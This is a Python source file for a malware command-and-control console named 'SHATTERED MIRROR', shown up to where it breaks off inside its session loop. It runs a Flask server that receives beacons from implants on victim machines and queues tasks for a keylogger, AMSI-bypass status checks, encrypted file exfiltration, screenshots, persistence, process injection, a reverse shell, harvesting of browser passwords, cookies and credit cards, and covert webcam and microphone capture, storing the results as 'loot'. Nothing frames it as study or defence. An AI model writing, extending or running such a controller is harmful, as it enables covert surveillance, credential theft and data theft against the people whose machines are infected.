#!/usr/bin/env python3
"""
SHATTERED MIRROR — Command & Control Console v1.0
FIXES:
  - Loot displays decoded plaintext.
  - PING shows RTT in ms.
  - Atom 04 (AMSI) is a STATUS CHECK only; bypass runs automatically.
  - Atom 05 exfil internal messages filtered from loot.
  - Atom 12 (Bale Bot) added.
  - Atom 06 (Screenshot) payload corrected to "RUN".
"""

import os
import sys
import threading
import time
import json
import subprocess
import logging
import msvcrt
import struct
import base64
from flask import Flask, request, jsonify
from Crypto.Cipher import AES
import socket
import random

# --- FLASK SETUP --------------------------------------------------------
app = Flask(__name__)
logging.getLogger('werkzeug').setLevel(logging.ERROR)

# --- COLORS -------------------------------------------------------------
R  = "\033[91m"
G  = "\033[92m"
C  = "\033[96m"
Y  = "\033[93m"
M  = "\033[95m"
W  = "\033[97m"
D  = "\033[90m"
B  = "\033[1m"
X  = "\033[0m"
BG = "\033[100m"

# --- GLOBAL STATE -------------------------------------------------------
bot_registry  = {}
task_queue    = {}
event_log     = []
start_time    = 0
screenshot_buffers = {} # { bot_ip: { "size": 0, "received": 0, "data": bytearray() } }

FLASK_PORT  = 6970
SHELL_PORT  = 4444
PUBLIC_PORT = 6969
TURBO_PORT  = 5556

script_dir = os.path.dirname(os.path.abspath(__file__))
LOG_DIR = os.path.join(script_dir, "..", "log")
LOOT_DIR = os.path.join(LOG_DIR, "loot")

# --- ATOM DEFINITIONS ---------------------------------------------------
ATOMS = {
    1:  {"name": "NET BEACON",     "icon": ">>", "desc": "C2 Communications",        "type": "auto"},
    2:  {"name": "KEYLOGGER",      "icon": "KB", "desc": "Capture Keystrokes",       "type": "prompt",  "ask": "Command (START / FLUSH / STOP)"},
    3:  {"name": "SYSTEM RECON",   "icon": "SI", "desc": "Hardware & Software Info",  "type": "simple",  "cmd": "START"},
    4:  {"name": "AMSI STATUS",    "icon": "AV", "desc": "Check AMSI Bypass State",  "type": "status", "cmd": "CHECK"},
    5:  {"name": "DATA EXFIL",     "icon": "EX", "desc": "Encrypted File Transfer",  "type": "prompt",  "ask": "Target file path (on victim)"},
    6:  {"name": "SCREENSHOT",     "icon": "SC", "desc": "Capture Display",          "type": "prompt",  "ask": "Mode (RUN / LIVE)"},
    7:  {"name": "PERSISTENCE",    "icon": "PS", "desc": "Survive Reboot",           "type": "simple",  "cmd": "START"},
    8:  {"name": "PROC INJECT",    "icon": "PI", "desc": "Inject Into Process",      "type": "prompt",  "ask": "Target PID or process name"},
    9:  {"name": "FILE SCANNER",   "icon": "FS", "desc": "Find Interesting Files",   "type": "manual"},
    10: {"name": "REVERSE SHELL",  "icon": "SH", "desc": "Interactive Terminal",     "type": "shell"},
    11: {"name": "PING",           "icon": "PN", "desc": "Latency Probe (RTT)",       "type": "simple",  "cmd": "PING"},
    12: {"name": "BALE BOT",       "icon": "BB", "desc": "Telegram-like C2 via Bale", "type": "simple", "cmd": "START"},
    13: {"name": "CRED HARVEST",   "icon": "CH", "desc": "Browser Passwords & Cookies", "type": "simple", "cmd": "START"},
    14: {"name": "SPY CAM/MIC",    "icon": "SM", "desc": "Camera + Microphone Capture", "type": "prompt", "ask": "Mode (MIC [sec] / CAM / BOTH [sec])"},
}

# --- TURBO TCP LISTENER --------------------------------------------------
def run_turbo_listener(port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(('127.0.0.1', port))
    except Exception as e:
        log_event(f"{R}Failed to bind Turbo port {port}: {e}{X}")
        return
    server.listen(10)
    
    while True:
        try:
            client, addr = server.accept()
            threading.Thread(target=handle_turbo_client, args=(client,), daemon=True).start()
        except: pass

def handle_turbo_client(client):
    data = bytearray()
    try:
        # Read all data — catch connection resets gracefully so we still
        # save whatever arrived before the socket was killed.
        try:
            while True:
                chunk = client.recv(65536)
                if not chunk: break
                data.extend(chunk)
        except (ConnectionResetError, ConnectionAbortedError, OSError):
            pass  # Socket was closed/reset, but data buffer may still have frames

        if len(data) > 10:
            # Try to peek first bytes to determine type
            head = data[:64].decode(errors='ignore')
            ext = ".bin"
            prefix = "turbo_stream"
            
            if "[SCREENSHOT" in head: ext = ".png"; prefix = "live_screen"
            elif "[SPY_MIC" in head: ext = ".wav"; prefix = "live_mic"
            elif "[SPY_CAM" in head: ext = ".bmp"; prefix = "live_cam"
            elif "[EXFIL" in head: ext = ".bin"; prefix = "exfil_file"
            elif "[CREDS" in head: ext = ".zip"; prefix = "creds_harvest"
            elif "[KEYLOG" in head: ext = ".txt"; prefix = "keylog_dump"
            elif "[FILESCAN" in head: ext = ".txt"; prefix = "filescan_results"
            elif "[FS_FILE" in head: ext = ".bin"; prefix = "filescan_exfil"
            
            output_dir = os.path.join(LOOT_DIR, "Turbo_TCP_Streams")
            os.makedirs(output_dir, exist_ok=True)
            out_path = os.path.join(output_dir, f"{prefix}_{time.strftime('%Y%m%d_%H%M%S')}_{int(time.time()*1000)%1000}{ext}")
            
            # Strip the string header (everything up to first null or bracket end)
            # Find end of header bracket ']'
            start_idx = 0
            bracket_pos = data.find(b']')
            if bracket_pos != -1:
                for i in range(bracket_pos, min(len(data), 128)):
                    if data[i] == 0:
                        start_idx = i + 1
                        break
            
            with open(out_path, "wb") as f:
                f.write(data[start_idx:] if start_idx > 0 else data)
                
            log_event(f"{G}TURBO STREAM{X} saved: {out_path} ({len(data)} bytes)")
            
    except Exception as e:
        log_event(f"{R}TURBO ERROR{X}: {e} (had {len(data)} bytes)")
    finally:
        try: client.close()
        except: pass

# --- EXFIL HANDLER -------------------------------------------------------
active_transfers = {}
EXFIL_AES_KEY = b"MySuperSecretAes256KeyForExfil!!"[:32]

def handle_exfil_chunk(bot_ip, data):
    if data.startswith(b"META:"):
        try:
            parts = data.decode().split(":")
            if len(parts) >= 3:
                filepath = parts[1]
                total_chunks = int(parts[2])
                transfer_id = f"{bot_ip}_{filepath.replace('/', '_').replace('\\', '_')}"
                active_transfers[transfer_id] = {
                    "path": filepath,
                    "total_chunks": total_chunks,
                    "chunks": {},
                    "bot_ip": bot_ip
                }
                print(f"[EXFIL] Transfer started: {filepath} ({total_chunks} chunks)")
                return "ACK:META"
        except Exception as e:
            print(f"[EXFIL] Error parsing META: {e}")
            pass
        return "META"

    if data.startswith(b"DONE:"):
        for tid, tinfo in list(active_transfers.items()):
            if tinfo["bot_ip"] == bot_ip:
                total = tinfo["total_chunks"]
                chunks = tinfo["chunks"]
                if len(chunks) == total:
                    output_dir = os.path.join(LOOT_DIR, bot_ip, "exfil")
                    os.makedirs(output_dir, exist_ok=True)
                    out_name = os.path.basename(tinfo["path"]) or "exfiltrated_file"
                    out_path = os.path.join(output_dir, out_name)
                    with open(out_path, "wb") as f:
                        for seq in range(total):
                            f.write(chunks.get(seq, b""))
                    print(f"[EXFIL] File saved: {out_path} ({len(chunks)} chunks)")
                else:
                    print(f"[EXFIL] Transfer incomplete: {len(chunks)}/{total} chunks received.")
                del active_transfers[tid]
                break
        return "DONE"

    if len(data) < 36:
        return ""

    header = data[:36]
    sequence   = struct.unpack("<I", header[0:4])[0]
    chunk_len  = struct.unpack("<I", header[4:8])[0]
    iv         = header[8:20]
    tag        = header[20:36]
    ciphertext = data[36:]

    if len(ciphertext) != chunk_len:
        print(f"[EXFIL] Chunk {sequence}: length mismatch.")
        return ""

    try:
        cipher = AES.new(EXFIL_AES_KEY, AES.MODE_GCM, nonce=iv)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    except Exception as e:
        print(f"[EXFIL] Chunk {sequence} decryption failed: {e}")
        return ""

    for tid, tinfo in list(active_transfers.items()):
        if tinfo["bot_ip"] == bot_ip:
            if sequence < tinfo["total_chunks"]:
                tinfo["chunks"][sequence] = plaintext
                print(f"[EXFIL] Chunk {sequence} stored ({len(plaintext)} bytes). "
                      f"Progress: {len(tinfo['chunks'])}/{tinfo['total_chunks']}")
                return f"ACK:{sequence}"
            else:
                print(f"[EXFIL] Chunk {sequence} out of range (max {tinfo['total_chunks']-1}).")
            break

    return ""

# --- HELPERS -------------------------------------------------------------
def cls():
    pass # os.system('cls' if os.name == 'nt' else 'clear')

def log_event(msg):
    ts = time.strftime("%H:%M:%S")
    formatted_msg = f"[{ts}] {msg}"
    event_log.append(formatted_msg)
    if len(event_log) > 100:
        event_log.pop(0)
    try:
        os.makedirs(LOOT_DIR, exist_ok=True)
        with open(os.path.join(LOOT_DIR, "event_history.log"), "a", encoding="utf-8") as f:
            # Strip ANSI escape codes for clean file writing
            import re
            clean_msg = re.sub(r'\x1b\[[0-9;]*m', '', formatted_msg)
            f.write(clean_msg + "\n")
    except:
        pass

def age_str(seconds):
    if seconds < 0:   return "???"
    if seconds < 60:   return f"{int(seconds)}s ago"
    if seconds < 3600: return f"{int(seconds // 60)}m {int(seconds % 60)}s"
    return f"{int(seconds // 3600)}h {int((seconds % 3600) // 60)}m"

def uptime_str():
    s = int(time.time() - start_time)
    h, r = divmod(s, 3600)
    m, s = divmod(r, 60)
    return f"{h}h {m:02d}m {s:02d}s"

def get_bot(ip):
    if ip not in bot_registry:
        bot_registry[ip] = {
            "last_seen": 0,
            "active_atoms": set(),
            "loot": [],
            "sys_info": "",
            "hostname": "",
            "os_ver": "",
            "task_log": [],
            "amsi_status": "UNKNOWN",
            "settings": {
                "6": {"proto": "HTTP", "port": str(PUBLIC_PORT)}, # Screenshot defaults
                "5": {"proto": "HTTP", "port": str(PUBLIC_PORT)}  # Exfil defaults
            }
        }
    return bot_registry[ip]

def save_loot_to_disk(bot_ip, atom_id, data):
    try:
        loot_dir = os.path.join(LOOT_DIR, bot_ip)
        os.makedirs(loot_dir, exist_ok=True)
        atom_name = ATOMS.get(atom_id, {}).get("name", "UNKNOWN").replace(" ", "_")
        file_path = os.path.join(loot_dir, f"Atom_{atom_id}_{atom_name}.txt")
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(f"\n--- {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
            f.write(data)
            f.write("\n")
    except Exception as e:
        log_event(f"Error saving loot to disk: {e}")

# --- FLASK ROUTES --------------------------------------------------------
@app.route('/api/v2/telemetry', methods=['POST'])
def telemetry():
    bot_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if bot_ip == "::1":
        bot_ip = "127.0.0.1"

    bot = get_bot(bot_ip)
    is_new = (bot["last_seen"] == 0)
    bot["last_seen"] = time.time()

    if is_new:
        log_event(f"{G}NEW IMPLANT{X} connected: {C}{bot_ip}{X}")

    data = request.get_json(silent=True)
    if data:
        report_id = data.get("report_id", "")
        blob      = data.get("diagnostic_blob", "")
        atom_id_r = data.get("atom_id", 0)

        if blob and blob not in ("heartbeat", "checkin", ""):
            try:
                decoded_blob = base64.b64decode(blob)
            except:
                decoded_blob = blob.encode()
            exfil_result = ""
            if atom_id_r == 5:
                exfil_result = handle_exfil_chunk(bot_ip, decoded_blob)

            if exfil_result in ("IGNORED", "META", "DONE"):
                if exfil_result == "ACK:META":
                    task_queue.setdefault(bot_ip, []).append({"atom_id": 5, "payload": "ACK:-1"})
            elif exfil_result.startswith("ACK:"):
                task_queue.setdefault(bot_ip, []).append({"atom_id": 5, "payload": exfil_result})
                log_event(f"{M}EXFIL ACK{X} queued for {bot_ip}: seq {exfil_result.split(':')[1]}")
            else:
                try:
                    display_text = decoded_blob.decode('utf-8', errors='replace')
                except:
                    display_text = decoded_blob.hex()

                if display_text.startswith("PONG|"):
                    for task in task_queue.get(bot_ip, []):
                        if task.get("atom_id") == 11 and "_send_ns" in task:
                            send_ns = task["_send_ns"]
                            rtt_ms = (time.perf_counter_ns() - send_ns) / 1_000_000.0
                            display_text = f"PONG | RTT: {rtt_ms:.2f} ms (QPC: {display_text.split('|')[1]})"
                            task.pop("_send_ns", None)
                            break

                if "[AMSI]" in display_text:
                    if "BYPASSED" in display_text:
                        bot["amsi_status"] = "BYPASSED"
                    elif "FAILED" in display_text or "not loaded" in display_text:
                        bot["amsi_status"] = "FAILED"
                    else:
                        bot["amsi_status"] = "UNKNOWN"

                if atom_id_r == 5:
                    if display_text.startswith("[EXFIL] ERROR:"):
                        bot["loot"].append({
                            "time": time.strftime("%Y-%m-%d %H:%M:%S"),
                            "type": report_id,
                            "atom": atom_id_r,
                            "data": display_text
                        })
                        save_loot_to_disk(bot_ip, atom_id_r, display_text)
                        summary = display_text.replace('\n', ' | ').replace('\r', '')[:100]
                        log_event(f"{M}LOOT{X} from {bot_ip}: {summary}")
                elif atom_id_r in (6, 13, 14):
                    # --- BINARY BLOB REASSEMBLY LOGIC (Screenshots, Mics, Creds) ---
                    if display_text.startswith("[SCREENSHOT_DATA] size=") or \
                       display_text.startswith("[SPY_CAM] size=") or \
                       display_text.startswith("[SPY_MIC] size=") or \
                       display_text.startswith("[CRED_FILE] name=") or \
                       display_text.startswith("[FS_FILE] name="):
                        
                        try:
                            file_type = "unknown"
                            ext = ".bin"
                            custom_name = ""
                            total_size = 0
                            
                            if display_text.startswith("[SCREENSHOT_DATA]"):
                                file_type = "screenshots"
                                ext = ".png"
                                total_size = int(display_text.split("=")[1])
                            elif display_text.startswith("[SPY_CAM]"):
                                file_type = "spy_cam"
                                ext = ".png"
                                total_size = int(display_text.split("=")[1])
                            elif display_text.startswith("[SPY_MIC]"):
                                file_type = "spy_mic"
                                ext = ".wav"
                                total_size = int(display_text.split("=")[1])
                            elif display_text.startswith("[CRED_FILE]"):
                                file_type = "creds"
                                parts = display_text.split(" ")
                                custom_name = parts[1].split("=")[1]
                                total_size = int(parts[2].split("=")[1])
                            elif display_text.startswith("[FS_FILE]"):
                                file_type = "smart_exfil"
                                parts = display_text.split(" ")
                                custom_name = parts[1].split("=")[1]
                                total_size = int(parts[2].split("=")[1])
                                ext = os.path.splitext(custom_name)[1]

                            screenshot_buffers[bot_ip] = {
                                "size": total_size,
                                "received": 0,
                                "data": bytearray(),
                                "type": file_type,
                                "ext": ext,
                                "name": custom_name
                            }
                            log_event(f"{G}BINARY DATA{X} incoming from {bot_ip} ({total_size} bytes, type: {file_type})")
                        except Exception as e:
                            log_event(f"Error parsing binary header: {e}")
                    elif bot_ip in screenshot_buffers:
                        buf = screenshot_buffers[bot_ip]
                        buf["data"].extend(decoded_blob)
                        buf["received"] += len(decoded_blob)
                        
                        # Log progress for every 5 chunks or so
                        if buf["received"] < buf["size"]:
                            log_event(f"  {D}Chunk received: {buf['received']}/{buf['size']} bytes ({len(decoded_blob)} byte chunk){X}")
                        
                        if buf["received"] >= buf["size"]:
                            # FINISHED!
                            output_dir = os.path.join(LOOT_DIR, bot_ip, buf["type"])
                            os.makedirs(output_dir, exist_ok=True)
                            ts = time.strftime("%Y%m%d_%H%M%S")
                            
                            if buf["name"]:
                                out_name = f"{buf['name']}_{ts}{buf['ext']}"
                            else:
                                out_name = f"{buf['type']}_{ts}{buf['ext']}"
                                
                            out_path = os.path.join(output_dir, out_name)
                            
                            with open(out_path, "wb") as f:
                                f.write(buf["data"])
                            
                            log_event(f"{G}BINARY DATA{X} saved to {C}{out_path}{X}")
                            
                            # AUTO-OPEN images/audio for LO
                            if buf["type"] in ("screenshots", "spy_cam", "spy_mic"):
                                try: os.startfile(out_path)
                                except: pass
                            
                            del screenshot_buffers[bot_ip]
                    elif "[CREDS]" in display_text:
                        # The text summary for Atom 13
                        bot["loot"].append({
                            "time": time.strftime("%Y-%m-%d %H:%M:%S"),
                            "type": report_id,
                            "atom": atom_id_r,
                            "data": display_text
                        })
                        save_loot_to_disk(bot_ip, atom_id_r, display_text)
                        summary = display_text.replace('\n', ' | ').replace('\r', '')[:100]
                        log_event(f"{M}LOOT{X} from {bot_ip}: {summary}")
                    elif display_text.startswith("[SPY_MIC] Recording failed") or display_text.startswith("[SPY_CAM] Capture failed"):
                        log_event(f"{R}SPY ERROR{X} from {bot_ip}: {display_text}")
                        save_loot_to_disk(bot_ip, atom_id_r, display_text)
                else:
                    bot["loot"].append({
                        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
                        "type": report_id,
                        "atom": atom_id_r,
                        "data": display_text
                    })
                    save_loot_to_disk(bot_ip, atom_id_r, display_text)
                    summary = display_text.replace('\n', ' | ').replace('\r', '')[:100]
                    log_event(f"{M}LOOT{X} from {bot_ip}: {summary}")

                if "Atom Injected" in display_text:
                    bot["task_log"].append(f"Atom deployed: {display_text}")
                    try:
                        for aid in range(1, 13):
                            if str(aid) in display_text:
                                bot["active_atoms"].add(aid)
                                break
                    except:
                        pass

                if "Host:" in display_text and "User:" in display_text:
                    lines = display_text.split('\n')
                    for ln in lines:
                        if ln.startswith("Host:"):
                            bot["hostname"] = ln.split(":", 1)[1].strip()
                        if ln.startswith("User:"):
                            bot["sys_info"] = ln.split(":", 1)[1].strip()

    if bot_ip in task_queue and task_queue[bot_ip]:
        task = task_queue[bot_ip].pop(0)
        atom_name = ATOMS.get(task.get("atom_id", 0), {}).get("name", "?")
        log_event(f"{Y}TASK{X} dispatched to {bot_ip}: {atom_name}")
        return json.dumps(task, separators=(',', ':')), 200

    return "NO_TASK", 200

@app.route('/api/v2/task/push', methods=['POST'])
def push_task():
    bot_ip = request.args.get('ip', '')
    if bot_ip == "::1":
        bot_ip = "127.0.0.1"
    data = request.get_json(silent=True)
    if data and bot_ip:
        task_queue.setdefault(bot_ip, []).append(data)
        return jsonify({"status": "queued"}), 200
    return jsonify({"status": "error", "reason": "missing ip or data"}), 400

@app.route('/api/v1/loot', methods=['POST'])
def receive_loot():
    bot_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if bot_ip == "::1":
        bot_ip = "127.0.0.1"
    data = request.get_json(silent=True)
    if data:
        bot = get_bot(bot_ip)
        blob = data.get('diagnostic_blob', '')
        if blob and blob != "dummy":
            bot["loot"].append({
                "time": time.strftime("%Y-%m-%d %H:%M:%S"),
                "type": "loot_push",
                "atom": 0,
                "data": blob
            })
            log_event(f"{M}LOOT{X} pushed from {bot_ip}")
    return jsonify({"status": "received"}), 200

def run_flask(port):
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# --- UI DRAWING ----------------------------------------------------------
def draw_banner():
    print(f"""
{R}{B}  ╔══════════════════════════════════════════════════════════════════╗
  ║                                                                  ║
  ║   ███████╗██╗  ██╗ █████╗ ████████╗████████╗███████╗██████╗      ║
  ║   ██╔════╝██║  ██║██╔══██╗╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗     ║
  ║   ███████╗███████║███████║   ██║      ██║   █████╗  ██████╔╝     ║
  ║   ╚════██║██╔══██║██╔══██║   ██║      ██║   ██╔══╝  ██╔══██╗     ║
  ║   ███████║██║  ██║██║  ██║   ██║      ██║   ███████╗██║  ██║     ║
  ║   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝     ║
  ║               MIRROR — COMMAND & CONTROL  v1.0                   ║
  ╠══════════════════════════════════════════════════════════════════╣
  ║  Bouncer : 0.0.0.0:{PUBLIC_PORT:<6}  │  Flask  : 127.0.0.1:{FLASK_PORT:<6}       ║
  ║  Shell   : 127.0.0.1:{SHELL_PORT:<5}  │  Uptime : {uptime_str():<17}      ║
  ╚══════════════════════════════════════════════════════════════════╝{X}
""")

def draw_bot_list():
    bots_alive = []
    bots_stale = []
    bots_dead  = []

    for ip, info in bot_registry.items():
        age = time.time() - info["last_seen"]
        entry = (ip, info, age)
        if (age < 30):
            bots_alive.append(entry)
        elif (age < 120):
            bots_stale.append(entry)
        else:
            bots_dead.append(entry)

    all_bots = bots_alive + bots_stale
    total = len(all_bots)

    print(f"  {C}{B}ACTIVE IMPLANTS ({total}){X}")
    print(f"  {D}{'─' * 72}{X}")
    print(f"   {W}{'#':>3}  {'IP Address':<20} {'Status':<12} {'Last Pulse':<14} {'Host':<12} Atoms{X}")
    print(f"  {D}{'─' * 72}{X}")

    idx = 1
    for ip, info, age in bots_alive:
        atoms = ",".join(str(a) for a in sorted(info.get("active_atoms", set()))) or "-"
        host = (info.get("hostname", "") or "-")[:11]
        print(f"   {G}{idx:>3}  {ip:<20} {'● ALIVE':<12} {age_str(age):<14} {host:<12} {atoms}{X}")
        idx += 1

    for ip, info, age in bots_stale:
        atoms = ",".join(str(a) for a in sorted(info.get("active_atoms", set()))) or "-"
        host = (info.get("hostname", "") or "-")[:11]
        print(f"   {Y}{idx:>3}  {ip:<20} {'○ STALE':<12} {age_str(age):<14} {host:<12} {atoms}{X}")
        idx += 1

    if total == 0:
        print(f"   {D}  (waiting for implant beacons on port {PUBLIC_PORT}...){X}")

    print(f"  {D}{'─' * 72}{X}")
    if bots_dead:
        print(f"   {D}({len(bots_dead)} inactive implants hidden — last seen >5m ago){X}")

    return all_bots

def draw_events(count=5):
    if not event_log:
        return
    print(f"\n  {D}RECENT EVENTS:{X}")
    for entry in event_log[-count:]:
        print(f"   {D}{entry}{X}")

def draw_session(target_ip):
    bot = bot_registry.get(target_ip, {})
    age = time.time() - bot.get("last_seen", 0)
    host = bot.get("hostname", "Unknown")
    user = bot.get("sys_info", "Unknown")
    active = bot.get("active_atoms", set())
    loot_count = len(bot.get("loot", []))
    pending = len(task_queue.get(target_ip, []))

    amsi_state = bot.get("amsi_status", "UNKNOWN")
    if amsi_state == "BYPASSED":
        amsi_display = f"{G}BYPASSED{X}"
    elif amsi_state == "FAILED":
        amsi_display = f"{R}FAILED{X}"
    else:
        amsi_display = f"{Y}UNKNOWN{X}"

    print(f"""
{C}{B}  ╔══════════════════════════════════════════════════════════════════╗
  ║  SESSION: {target_ip:<55}║
  ╠══════════════════════════════════════════════════════════════════╣
  ║  Host: {host:<14}  User: {user:<14}  Pulse: {age_str(age):<14}  ║
  ║  AMSI: {amsi_display:<67}║
  ╚══════════════════════════════════════════════════════════════════╝{X}
""")

    print(f"  {C}{B}ATOM ARSENAL{X}")
    print(f"  {D}{'─' * 72}{X}")
    print(f"   {W}{'#':>3}  {'':2} {'Atom':<16} {'Description':<28} State{X}")
    print(f"  {D}{'─' * 72}{X}")

    for aid in sorted(ATOMS.keys()):
        atom = ATOMS[aid]
        icon = atom["icon"]
        name = atom["name"]
        desc = atom["desc"]

        if atom["type"] == "auto":
            state = f"{D}[AUTO]{X}"
        elif atom["type"] == "status":
            if aid == 4:
                if amsi_state == "BYPASSED":
                    state = f"{G}[BYPASSED]{X}"
                elif amsi_state == "FAILED":
                    state = f"{R}[FAILED]{X}"
                else:
                    state = f"{Y}[UNKNOWN]{X}"
            else:
                state = f"{W}[IDLE]{X}"
        elif aid in active:
            state = f"{G}[ACTIVE]{X}"
        else:
            state = f"{W}[IDLE]{X}"

        color = G if aid in active else W
        if aid == 4:
            color = G if amsi_state == "BYPASSED" else (R if amsi_state == "FAILED" else W)
        print(f"   {color}{aid:>3}  [{icon}] {name:<16} {desc:<28} {state}")

    print(f"  {D}{'─' * 72}{X}")
    print(f"\n   {D}Pending Tasks: {Y}{pending}{X}   {D}│   Loot Items: {G}{loot_count}{X}")

def draw_loot_page(target_ip):
    cls()
    bot = bot_registry.get(target_ip, {})
    loot = bot.get("loot", [])

    print(f"\n  {M}{B}LOOT VAULT — {target_ip}{X}")
    print(f"  {D}{'─' * 72}{X}")

    if not loot:
        print(f"\n   {D}(no loot collected from this implant yet){X}")
        print(f"   {D}Deploy atoms to start collecting data.{X}")
    else:
        for i, item in enumerate(loot):
            t     = item.get("time", "?")
            data  = item.get("data", "")
            itype = item.get("type", "unknown")
            atom  = item.get("atom", "?")
            header_color = Y if "result" in itype else M

            print(f"\n   {header_color}[{i+1}] {t}  │  {itype}  │  Atom: {atom}{X}")
            lines = data.split('\n')
            for line in lines[:15]:
                print(f"       {W}{line[:90]}{X}")
            if len(lines) > 15:
                print(f"       {D}... ({len(lines)} lines, {len(data)} bytes total){X}")

    print(f"\n  {D}{'─' * 72}{X}")
    print(f"   {D}Total: {len(loot)} items{X}")
    input(f"\n   {D}Press Enter to go back... {X}")

def draw_global_loot():
    cls()
    print(f"\n  {M}{B}GLOBAL LOOT VAULT{X}")
    print(f"  {D}{'─' * 72}{X}")

    total = 0
    for ip, info in bot_registry.items():
        loot = info.get("loot", [])
        if not loot:
            continue
        total += len(loot)
        print(f"\n   {C}[{ip}] — {len(loot)} item(s){X}")
        for item in loot[-3:]:
            t = item.get("time", "?")
            data = item.get("data", "")[:70]
            first_line = data.split('\n')[0]
            print(f"     {D}{t}{X}  {W}{first_line}{X}")
        if len(loot) > 3:
            print(f"     {D}... and {len(loot) - 3} more{X}")

    if total == 0:
        print(f"\n   {D}(no loot from any implant){X}")

    print(f"\n  {D}{'─' * 72}{X}")
    print(f"   {D}Total across all implants: {total} items{X}")
    input(f"\n   {D}Press Enter to go back... {X}")

# --- ATOM DEPLOYMENT -----------------------------------------------------
def deploy_atom(target_ip, atom_id):
    atom = ATOMS.get(atom_id)
    if not atom:
        print(f"\n   {R}[!] Invalid atom ID: {atom_id}{X}")
        time.sleep(1)
        return

    bot = get_bot(target_ip)

    if atom["type"] == "auto":
        print(f"\n   {Y}[*] {atom['name']} is managed by the Orchestrator automatically.{X}")
        print(f"   {D}    It starts with the implant — no manual deployment needed.{X}")
        time.sleep(2)
        return

    if atom["type"] == "status":
        print(f"\n   {C}[*] Requesting {atom['name']} status check...{X}")
        task_queue.setdefault(target_ip, []).append({
            "atom_id": atom_id,
            "payload": atom.get("cmd", "CHECK")
        })
        log_event(f"{atom['name']} status check queued for {target_ip}")
        print(f"   {G}[+] Status check queued. Implant will report back shortly.{X}")
        time.sleep(2)
        return

    if (atom_id == 9):
        deploy_file_scanner(target_ip)
        return

    if atom["type"] == "shell":
        print(f"\n   {C}[*] Deploying Reverse Shell...{X}")
        print(f"   {D}    Step 1: Queue shell task for implant{X}")
        print(f"   {D}    Step 2: Wait for implant to beacon & connect{X}")
        print(f"   {D}    Step 3: Bouncer will automatically spawn the Shell Window{X}")

        task_queue.setdefault(target_ip, []).append({"atom_id": 10, "payload": "START"})
        bot["active_atoms"].add(10)
        log_event(f"SHELL task queued for {target_ip}")

        time.sleep(0.5)
        print(f"\n   {G}[+] Task queued. A Shell window will pop up automatically when the implant connects.{X}")


        time.sleep(2)
        return

    payload = ""
    if atom["type"] == "prompt":
        default = ""
        if atom_id == 9:
            default = "C:\\Users"
        print(f"\n   {C}[?] {atom['ask']}{X}")
        if default:
            user_in = input(f"   {W}    [{default}]: {X}").strip()
            payload = user_in if user_in else default
        else:
            payload = input(f"   {W}    > {X}").strip()

        # Zip/Resume logic for Atom 5
        if atom_id == 5 and payload:
            # Check for directory report from previous attempt
            # (Note: In a real run, we'd check the bot's loot/status, but for this flow we handle the immediate prompt)
            tid = f"{target_ip}_{payload.replace('/', '_').replace('\\', '_')}"
            
            # If we just tried this path and got a DIR_DETECTED message
            # (Simplified for the UI flow)
            if payload.endswith("\\") or payload.endswith("/"):
                 print(f"\n   {Y}[!] Path appears to be a directory.{X}")
                 choice = input(f"   {W}[?] Zip folder and exfiltrate? (y/n): {X}").lower()
                 if choice == 'y':
                     payload = f"ZIP:{payload}"
                 else:
                     return

            if tid in active_transfers:
                info = active_transfers[tid]
                current = len(info["chunks"])
                total = info["total_chunks"]
                if current < total:
                    print(f"\n   {Y}[!] Partial transfer detected for this file.{X}")
                    print(f"       Progress: {C}{current}/{total}{X} chunks.")
                    choice = input(f"   {W}[?] Resume from chunk {current}? (y/n): {X}").lower()
                    if choice == 'y':
                        payload = f"RESUME:{current}:{payload}"

        if not payload:
            print(f"   {Y}[!] Cancelled — no input given.{X}")
            time.sleep(1)
            return
    elif atom["type"] == "simple":
        payload = atom.get("cmd", "START")

    task_data = {
        "atom_id": atom_id,
        "payload": payload
    }
    if atom_id == 11:
        task_data["_send_ns"] = time.perf_counter_ns()

    task_queue.setdefault(target_ip, []).append(task_data)
    bot["active_atoms"].add(atom_id)

    atom_name = atom["name"]
    log_event(f"{atom_name} queued for {target_ip}")

    print(f"\n   {G}[+] {atom_name} task queued for {target_ip}{X}")
    print(f"   {D}    Payload: \"{payload}\"{X}")
    print(f"   {D}    Will activate on next implant beacon (2-5s cycle).{X}")

    hints = {
        2:  "Keylogger: 'START' to hook, 'FLUSH' to get data now, 'STOP' to flush, unhook, and exit cleanly.",
        3:  "System recon will collect hostname, user, processes, and send back.",
        4:  "This checks if the automatic AMSI bypass is active. No installation performed.",
        5:  "File will be AES-256-GCM encrypted before transfer.",
        6:  "Screenshot: 'RUN' for single shot, 'LIVE' for adaptive live stream (2-5 FPS).",
        7:  "Persistence via COM Task Scheduler — survives reboot.",
        8:  "Code injection via section mapping (no RWX memory).",
        9:  "Enter 'DRIVES' to map the system, or 'C:\\| .pdf | secret' for a targeted smart scan.",
        11: "Ping will respond instantly with a high‑resolution timestamp for RTT measurement.",
        12: "Starts the Bale bot long‑polling client. Sends an online message and listens for commands.",
        13: "Harvests saved passwords, cookies, and credit cards from Chrome, Edge, and Brave.",
        14: "Spy: 'MIC' for audio, 'CAM' for webcam snapshot, 'BOTH' for full capture.",
    }
    if atom_id in hints:
        print(f"   {D}    Note: {hints[atom_id]}{X}")

    time.sleep(2)

# --- BOT SESSION ---------------------------------------------------------
def bot_session(target_ip):
    while True:
        cls()
        draw_session(target_ip)
        draw_events(3)

        print(f"\n   {W}Enter atom {C}#{W} to deploy  │  {C}t{W} = tune  │  {C}l{W} = loot  │  {C}s{W} = sysinfo  │  {C}q{W} = back{X}")
        print(f"   {D}/force_stop = kill live feeds  │  /stop_live = clean stop{X}")
        choice = input(f"   {W}> {X}").strip().lower()

        if choice == 'q' or choice == 'quit':
            break
        elif choice == '/force_stop':
            # Stop Screen & Spy atoms immediately
            task_queue.setdefault(target_ip, []).append({"atom_id": 6, "payload": "TERMINATE"})
